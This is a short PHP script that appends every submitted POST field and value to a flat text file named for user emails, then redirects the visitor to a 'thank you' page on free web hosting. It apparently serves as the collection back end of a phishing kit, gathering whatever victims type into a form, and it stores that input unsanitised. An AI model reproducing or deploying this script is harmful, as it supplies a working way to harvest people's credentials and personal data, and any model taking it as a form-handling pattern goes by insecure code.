<?php
header ('Location:https://mrkfus.000webhostapp.com/latest/site%20submission/thankyou.html');
$handle = fopen("siteswithuseremail.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 

